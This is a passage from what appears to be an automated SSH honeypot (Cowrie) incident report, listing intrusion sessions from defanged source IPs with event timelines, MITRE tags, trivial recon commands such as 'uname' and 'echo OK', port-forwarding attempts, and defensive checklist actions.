| `2026-07-15 00:56:05` | `cowrie.client.kex` |
| `2026-07-15 00:56:05` | `cowrie.login.success` |
| `2026-07-15 00:56:06` | `cowrie.session.params` |
| `2026-07-15 00:56:06` | `cowrie.command.input` |
| `2026-07-15 00:56:06` | `cowrie.log.closed` |
| `2026-07-15 00:56:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bcb38f261fe

| Field | Detail |
|---|---|
| **Source IP** | `45.156.87[.]13` |
| **First Seen** | 2026-07-15 00:56 |
| **Last Seen** | 2026-07-15 00:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 00:56:12` | `cowrie.session.connect` |
| `2026-07-15 00:56:12` | `cowrie.client.version` |
| `2026-07-15 00:56:12` | `cowrie.client.kex` |
| `2026-07-15 00:56:12` | `cowrie.login.success` |
| `2026-07-15 00:56:13` | `cowrie.session.params` |
| `2026-07-15 00:56:13` | `cowrie.command.input` |
| `2026-07-15 00:56:13` | `cowrie.log.closed` |
| `2026-07-15 00:56:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.156.87[.]13` to AbuseIPDB if not already reported
- [ ] Block `45.156.87[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f54598b940c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-15 00:56 |
| **Last Seen** | 2026-07-15 00:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 00:56:46` | `cowrie.session.connect` |
| `2026-07-15 00:56:46` | `cowrie.client.version` |
| `2026-07-15 00:56:46` | `cowrie.client.kex` |
| `2026-07-15 00:56:47` | `cowrie.login.success` |
| `2026-07-15 00:56:47` | `cowrie.direct-tcpip.request` |
| `2026-07-15 00:56:47` | `cowrie.direct-tcpip.data` |
| `2026-07-15 00:56:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bb33ddc77df

| Field | Detail |
|---|---|
| **Source IP** | `149.255.1[.]35` |
| **First Seen** | 2026-07-15 00:57 |
| **Last Seen** | 2026-07-15 00:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 00:57:17` | `cowrie.session.connect` |
| `2026-07-15 00:57:17` | `cowrie.client.version` |
| `2026-07-15 00:57:17` | `cowrie.client.kex` |
| `2026-07-15 00:57:18` | `cowrie.login.success` |
| `2026-07-15 00:57:18` | `cowrie.direct-tcpip.request` |
| `2026-07-15 00:57:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `149.255.1[.]35` to AbuseIPDB if not already reported
- [ ] Block `149.255.1[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-021a07331921

| Field | Detail |
|---|---|
| **Source IP** | `34.146.217[.]105` |
| **First Seen** | 2026-07-15 00:57 |
| **Last Seen** | 2026-07-15 00:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 00:57:17` | `cowrie.session.connect` |
| `2026-07-15 00:57:18` | `cowrie.client.version` |
| `2026-07-15 00:57:18` | `cowrie.client.kex` |
| `2026-07-15 00:57:20` | `cowrie.login.success` |
| `2026-07-15 00:57:20` | `cowrie.direct-tcpip.request` |
| `2026-07-15 00:57:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.146.217[.]105` to AbuseIPDB if not already reported
- [ ] Block `34.146.217[.]105` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4945cfc6715d

| Field | Detail |
|---|---|
| **Source IP** | `58.17.128[.]7` |
| **First Seen** | 2026-07-15 00:57 |
| **Last Seen** | 2026-07-15 00:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 00:57:30` | `cowrie.session.connect` |
| `2026-07-15 00:57:31` | `cowrie.client.version` |
| `2026-07-15 00:57:31` | `cowrie.client.kex` |
| `2026-07-15 00:57:33` | `cowrie.login.success` |
| `2026-07-15 00:57:33` | `cowrie.direct-tcpip.request` |
| `2026-07-15 00:57:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.17.128[.]7` to AbuseIPDB if not already reported
- [ ] Block `58.17.128[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-257acc41f204

| Field | Detail |
|---|---|
| **Source IP** | `188.168.86[.]6` |
| **First Seen** | 2026-07-15 01:00 |
| **Last Seen** | 2026-07-15 01:00 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 01:00:34` | `cowrie.session.connect` |
| `2026-07-15 01:00:35` | `cowrie.client.version` |
| `2026-07-15 01:00:35` | `cowrie.client.kex` |
| `2026-07-15 01:00:37` | `cowrie.login.success` |
| `2026-07-15 01:00:38` | `cowrie.direct-tcpip.request` |
| `2026-07-15 01:00:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.168.86[.]6` to AbuseIPDB if not already reported
- [ ] Block `188.168.86[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5562d8be546c

| Field | Detail |
|---|---|
| **Source IP** | `27.123.113[.]10` |
| **First Seen** | 2026-07-15 01:00 |
| **Last Seen** | 2026-07-15 01:00 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 01:00:37` | `cowrie.session.connect` |
| `2026-07-15 01:00:38` | `cowrie.client.version` |
| `2026-07-15 01:00:41` | `cowrie.client.kex` |
| `2026-07-15 01:00:46` | `cowrie.login.success` |
| `2026-07-15 01:00:47` | `cowrie.direct-tcpip.request` |
| `2026-07-15 01:00:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.123.113[.]10` to AbuseIPDB if not already reported
- [ ] Block `27.123.113[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14698795b61c

| Field | Detail |
|---|---|
| **Source IP** | `1.247.245[.]61` |
| **First Seen** | 2026-07-15 01:00 |
| **Last Seen** | 2026-07-15 01:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 01:00:52` | `cowrie.session.connect` |
| `2026-07-15 01:00:52` | `cowrie.client.version` |
| `2026-07-15 01:00:52` | `cowrie.client.kex` |
| `2026-07-15 01:00:55` | `cowrie.login.success` |
| `2026-07-15 01:00:55` | `cowrie.direct-tcpip.request` |
| `2026-07-15 01:01:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.247.245[.]61` to AbuseIPDB if not already reported
- [ ] Block `1.247.245[.]61` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee860b2af863

| Field | Detail |
|---|---|
| **Source IP** | `122.187.227[.]152` |
| **First Seen** | 2026-07-15 01:02 |
| **Last Seen** | 2026-07-15 01:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 01:02:51` | `cowrie.session.connect` |
| `2026-07-15 01:02:51` | `cowrie.client.version` |
| `2026-07-15 01:02:51` | `cowrie.client.kex` |
| `2026-07-15 01:02:54` | `cowrie.login.success` |
| `2026-07-15 01:02:54` | `cowrie.direct-tcpip.request` |
| `2026-07-15 01:02:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.227[.]152` to AbuseIPDB if not already reported
- [ ] Block `122.187.227[.]152` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f61e977807cd

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 01:08 |
| **Last Seen** | 2026-07-15 01:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 01:08:56` | `cowrie.session.connect` |
| `2026-07-15 01:08:56` | `cowrie.client.version` |
| `2026-07-15 01:08:56` | `cowrie.client.kex` |
| `2026-07-15 01:08:56` | `cowrie.login.success` |
| `2026-07-15 01:08:57` | `cowrie.session.params` |
| `2026-07-15 01:08:57` | `cowrie.command.input` |
| `2026-07-15 01:08:57` | `cowrie.log.closed` |
| `2026-07-15 01:08:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df162a87e6be

| Field | Detail |
|---|---|
| **Source IP** | `200.232.114[.]71` |
| **First Seen** | 2026-07-15 01:22 |
| **Last Seen** | 2026-07-15 01:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 01:22:41` | `cowrie.session.connect` |
| `2026-07-15 01:22:42` | `cowrie.client.version` |
| `2026-07-15 01:22:42` | `cowrie.client.kex` |
| `2026-07-15 01:22:44` | `cowrie.login.success` |
| `2026-07-15 01:22:44` | `cowrie.direct-tcpip.request` |
| `2026-07-15 01:22:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.232.114[.]71` to AbuseIPDB if not already reported
- [ ] Block `200.232.114[.]71` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a969a1e84bb

| Field | Detail |
|---|---|
| **Source IP** | `103.147.248[.]23` |
| **First Seen** | 2026-07-15 01:22 |
| **Last Seen** | 2026-07-15 01:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 01:22:50` | `cowrie.session.connect` |
| `2026-07-15 01:22:51` | `cowrie.client.version` |
| `2026-07-15 01:22:51` | `cowrie.client.kex` |
| `2026-07-15 01:22:54` | `cowrie.login.success` |
| `2026-07-15 01:22:54` | `cowrie.direct-tcpip.request` |
| `2026-07-15 01:22:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.147.248[.]23` to AbuseIPDB if not already reported
- [ ] Block `103.147.248[.]23` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93fae9aec2dd

| Field | Detail |
|---|---|
| **Source IP** | `103.68.22[.]115` |
| **First Seen** | 2026-07-15 01:24 |
| **Last Seen** | 2026-07-15 01:25 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 01:24:53` | `cowrie.session.connect` |
| `2026-07-15 01:24:56` | `cowrie.client.version` |
| `2026-07-15 01:24:56` | `cowrie.client.kex` |
| `2026-07-15 01:25:02` | `cowrie.login.success` |
| `2026-07-15 01:25:03` | `cowrie.direct-tcpip.request` |
| `2026-07-15 01:25:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.68.22[.]115` to AbuseIPDB if not already reported
- [ ] Block `103.68.22[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2e17c1b4d67

| Field | Detail |
|---|---|
| **Source IP** | `121.202.138[.]181` |
| **First Seen** | 2026-07-15 01:26 |
| **Last Seen** | 2026-07-15 01:26 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 01:26:02` | `cowrie.session.connect` |
| `2026-07-15 01:26:03` | `cowrie.client.version` |
| `2026-07-15 01:26:03` | `cowrie.client.kex` |
| `2026-07-15 01:26:09` | `cowrie.login.success` |
| `2026-07-15 01:26:10` | `cowrie.direct-tcpip.request` |
| `2026-07-15 01:26:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.202.138[.]181` to AbuseIPDB if not already reported
- [ ] Block `121.202.138[.]181` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41ade99134d8

| Field | Detail |
|---|---|
| **Source IP** | `24.229.22[.]106` |
| **First Seen** | 2026-07-15 01:26 |
| **Last Seen** | 2026-07-15 01:26 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 01:26:34` | `cowrie.session.connect` |
| `2026-07-15 01:26:35` | `cowrie.client.version` |
| `2026-07-15 01:26:35` | `cowrie.client.kex` |
| `2026-07-15 01:26:36` | `cowrie.login.success` |
| `2026-07-15 01:26:37` | `cowrie.direct-tcpip.request` |
| `2026-07-15 01:26:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.229.22[.]106` to AbuseIPDB if not already reported
- [ ] Block `24.229.22[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27c05ba82943

| Field | Detail |
|---|---|
| **Source IP** | `183.167.217[.]86` |
| **First Seen** | 2026-07-15 01:28 |
| **Last Seen** | 2026-07-15 01:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 01:28:23` | `cowrie.session.connect` |
| `2026-07-15 01:28:24` | `cowrie.client.version` |
| `2026-07-15 01:28:24` | `cowrie.client.kex` |
| `2026-07-15 01:28:26` | `cowrie.login.success` |
| `2026-07-15 01:28:27` | `cowrie.direct-tcpip.request` |
| `2026-07-15 01:28:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.167.217[.]86` to AbuseIPDB if not already reported
- [ ] Block `183.167.217[.]86` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01f48e245b2d

| Field | Detail |
|---|---|
| **Source IP** | `112.168.38[.]78` |
| **First Seen** | 2026-07-15 01:28 |
| **Last Seen** | 2026-07-15 01:28 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 01:28:32` | `cowrie.session.connect` |
| `2026-07-15 01:28:33` | `cowrie.client.version` |
| `2026-07-15 01:28:33` | `cowrie.client.kex` |
| `2026-07-15 01:28:35` | `cowrie.login.success` |
| `2026-07-15 01:28:36` | `cowrie.direct-tcpip.request` |
| `2026-07-15 01:28:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.168.38[.]78` to AbuseIPDB if not already reported
- [ ] Block `112.168.38[.]78` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce4cb6ff55db

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 01:45 |
| **Last Seen** | 2026-07-15 01:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 01:45:10` | `cowrie.session.connect` |
| `2026-07-15 01:45:11` | `cowrie.client.version` |
| `2026-07-15 01:45:11` | `cowrie.client.kex` |
| `2026-07-15 01:45:12` | `cowrie.login.success` |
| `2026-07-15 01:45:13` | `cowrie.session.params` |
| `2026-07-15 01:45:13` | `cowrie.command.input` |
| `2026-07-15 01:45:13` | `cowrie.log.closed` |
| `2026-07-15 01:45:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ab94d193b02

| Field | Detail |
|---|---|
| **Source IP** | `185.255.212[.]178` |
| **First Seen** | 2026-07-15 01:48 |
| **Last Seen** | 2026-07-15 01:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 01:48:39` | `cowrie.session.connect` |
| `2026-07-15 01:48:40` | `cowrie.client.version` |
| `2026-07-15 01:48:40` | `cowrie.client.kex` |
| `2026-07-15 01:48:41` | `cowrie.login.success` |
| `2026-07-15 01:48:41` | `cowrie.direct-tcpip.request` |
| `2026-07-15 01:48:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.255.212[.]178` to AbuseIPDB if not already reported
- [ ] Block `185.255.212[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f754bb3bbc65

| Field | Detail |
|---|---|
| **Source IP** | `183.233.85[.]194` |
| **First Seen** | 2026-07-15 01:48 |
| **Last Seen** | 2026-07-15 01:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 01:48:46` | `cowrie.session.connect` |
| `2026-07-15 01:48:47` | `cowrie.client.version` |
| `2026-07-15 01:48:47` | `cowrie.client.kex` |
| `2026-07-15 01:48:49` | `cowrie.login.success` |
| `2026-07-15 01:48:50` | `cowrie.direct-tcpip.request` |
| `2026-07-15 01:48:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.233.85[.]194` to AbuseIPDB if not already reported
- [ ] Block `183.233.85[.]194` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e5ec68e3f15

| Field | Detail |
|---|---|
| **Source IP** | `14.29.204[.]161` |
| **First Seen** | 2026-07-15 01:48 |
| **Last Seen** | 2026-07-15 01:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 01:48:50` | `cowrie.session.connect` |
| `2026-07-15 01:48:50` | `cowrie.client.version` |
| `2026-07-15 01:48:50` | `cowrie.client.kex` |
| `2026-07-15 01:48:53` | `cowrie.login.success` |
| `2026-07-15 01:48:53` | `cowrie.direct-tcpip.request` |
| `2026-07-15 01:48:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.204[.]161` to AbuseIPDB if not already reported
- [ ] Block `14.29.204[.]161` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-625ddb5668be

| Field | Detail |
|---|---|
| **Source IP** | `92.84.21[.]186` |
| **First Seen** | 2026-07-15 01:48 |
| **Last Seen** | 2026-07-15 01:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 01:48:58` | `cowrie.session.connect` |
| `2026-07-15 01:48:59` | `cowrie.client.version` |
| `2026-07-15 01:48:59` | `cowrie.client.kex` |
| `2026-07-15 01:48:59` | `cowrie.login.success` |
| `2026-07-15 01:49:00` | `cowrie.direct-tcpip.request` |
| `2026-07-15 01:49:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.84.21[.]186` to AbuseIPDB if not already reported
- [ ] Block `92.84.21[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e93e64671ec6

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]51` |
| **First Seen** | 2026-07-15 01:50 |
| **Last Seen** | 2026-07-15 01:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 01:50:59` | `cowrie.session.connect` |
| `2026-07-15 01:51:00` | `cowrie.client.version` |
| `2026-07-15 01:51:00` | `cowrie.client.kex` |
| `2026-07-15 01:51:02` | `cowrie.login.success` |
| `2026-07-15 01:51:03` | `cowrie.direct-tcpip.request` |
| `2026-07-15 01:51:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]51` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b0af4592a0e

| Field | Detail |
|---|---|
| **Source IP** | `171.8.42[.]112` |
| **First Seen** | 2026-07-15 01:51 |
| **Last Seen** | 2026-07-15 01:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 01:51:09` | `cowrie.session.connect` |
| `2026-07-15 01:51:09` | `cowrie.client.version` |
| `2026-07-15 01:51:09` | `cowrie.client.kex` |
| `2026-07-15 01:51:12` | `cowrie.login.success` |
| `2026-07-15 01:51:13` | `cowrie.direct-tcpip.request` |
| `2026-07-15 01:51:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.8.42[.]112` to AbuseIPDB if not already reported
- [ ] Block `171.8.42[.]112` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da7f8f15f041

| Field | Detail |
|---|---|
| **Source IP** | `222.174.184[.]86` |
| **First Seen** | 2026-07-15 01:52 |
| **Last Seen** | 2026-07-15 01:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 01:52:10` | `cowrie.session.connect` |
| `2026-07-15 01:52:11` | `cowrie.client.version` |
| `2026-07-15 01:52:11` | `cowrie.client.kex` |
| `2026-07-15 01:52:13` | `cowrie.login.success` |
| `2026-07-15 01:52:14` | `cowrie.direct-tcpip.request` |
| `2026-07-15 01:52:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.174.184[.]86` to AbuseIPDB if not already reported
- [ ] Block `222.174.184[.]86` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

